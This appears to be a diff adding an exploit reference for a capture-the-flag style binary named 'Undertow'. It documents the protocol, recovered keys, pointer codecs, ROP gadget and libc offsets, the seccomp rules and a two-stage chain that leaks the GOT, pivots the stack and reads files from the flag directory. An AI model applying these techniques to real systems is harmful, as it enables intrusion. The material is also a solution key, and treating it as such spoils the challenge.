@@ -1,0 +1,121 @@
+Undertow protocol, structure, and exploit reference
+===================================================
+
+Binary
+------
+Architecture: x86-64 little-endian
+Type:         PIE, dynamically linked, stripped
+Mitigations:  Full RELRO, NX, stack canary, PIE
+Runtime:      Ubuntu glibc 2.39-0ubuntu8.8
+
+Protocol
+--------
+100 6                       protocol version
+101 <16-hex-digit token>    random per-connection session token
+901 1 2 3 4 5 6 7 8 9     command list
+900                         ready marker
+
+1: 110                     create a checkpoint
+2: 210 <encoded function>  inspect encoded checkpoint function
+   211 <encoded scratch>   inspect encoded scratch mapping
+3: 310                     commit active checkpoint to quarantine
+4: 410 / 411               read an exact 0x500-byte snapshot
+5: 510 / size / 511 / data / 512
+                            upload 1..0x1000 bytes to scratch
+6: 610                     restore a valid committed checkpoint
+8: 810 / crc16 / 812 bit   one-bit seal oracle, then process exits
+9: 910 / byte / 911        allocate, fill, and quarantine a record
+
+Fixed seal recovered from the captured instance
+------------------------------------------------
+4eaf20afbf05b2f1805d0261950df065
+
+Derived keys for that seal
+--------------------------
+pointer_add = 0xc8409b0cc93d0260
+pointer_xor = 0xa80401579b02d35d
+context_add = 0xe76c4c0f1a31828e
+context_xor = 0x9c3d2ffe6cb548fe
+
+Pointer codecs
+--------------
+allocator_encode(p) = rol64(p XOR pointer_xor, 7) + pointer_add
+context_encode(p)   = rol64(p XOR context_xor, 13) + context_add
+
+Checkpoint record (0x500 bytes)
+--------------------------------
++0x40  saved rbx
++0x48  saved rbp
++0x50  saved r12
++0x58  saved r13
++0x60  saved r14
++0x68  saved r15
++0x70  encoded rsp
++0x78  encoded rip
++0x80  integrity hash over qwords +0x40 through +0x78
+
+Allocator routing for the captured seal
+----------------------------------------
+checkpoint allocation/commit list = (seal[2] XOR 0x552) mod 3 = 2
+snapshot allocation list          = (seal[2] XOR 0x55a) mod 3 = 1
+
+For command 9 input v:
+    mixed      = (v * 0xc5 + seal[4]) & 0xff
+    source     = mixed mod 3
+    destination= (seal[5] + floor(mixed / 3)) mod 3
+
+Route [0, 0, 5, 0, 0] releases the live checkpoint to list 2, reclaims it,
+retags it for list 1, and releases it there for command 4 to overwrite.
+
+PIE offsets
+-----------
+0x1050  _exit@plt
+0x1428  pop rsi; pop r15; ret (unaligned)
+0x142a  pop rdi; ret (unaligned)
+0x20f9  pop rsp; pop r13; ret (unaligned)
+0x2130  read_exact
+0x2320  write_exact
+0x2370  checkpoint_save
+0x23c0  checkpoint_restore
+0x4f30  start of PLT GOT
+0x4f50  write@GOT
+
+Supplied libc offsets
+---------------------
+0x04a960  setcontext
+0x11c690  write
+0x127370  syscall
+
+Seccomp allowlist
+-----------------
+0    read
+1    write
+60   exit
+217  getdents64
+231  exit_group
+437  openat2, only when:
+     dirfd == 9
+     how == scratch+0x3f00
+     size == 24
+
+The fixed open_how is { flags=0, mode=0, resolve=0x0a }. File descriptor 9
+is an O_DIRECTORY descriptor opened from UNDERTOW_FLAG_DIR before seccomp.
+
+Stage one
+---------
+1. write_exact(PIE+0x4f30, 0xa8) leaks the complete PLT GOT range.
+2. write@GOT is at leak offset 0x20; subtract libc+0x11c690.
+3. read_exact(scratch+0x1000, 0x1000) receives stage two.
+4. Pivot rsp to scratch+0x1000.
+
+Stage two
+---------
+setcontext+0x20 begins at "pop rdx", skipping the forbidden
+rt_sigprocmask syscall at the normal setcontext entry. Crafted contexts invoke:
+
+1. getdents64(9, scratch+0x2000, 0x400)
+2. write(1, scratch+0x2000, 0x400)
+3. read(0, scratch+0x2800, 0x100)
+4. openat2(9, scratch+0x2800, scratch+0x3f00, 24)
+5. read(3, scratch+0x2400, 0x100)
+6. write(1, scratch+0x2400, 0x100)
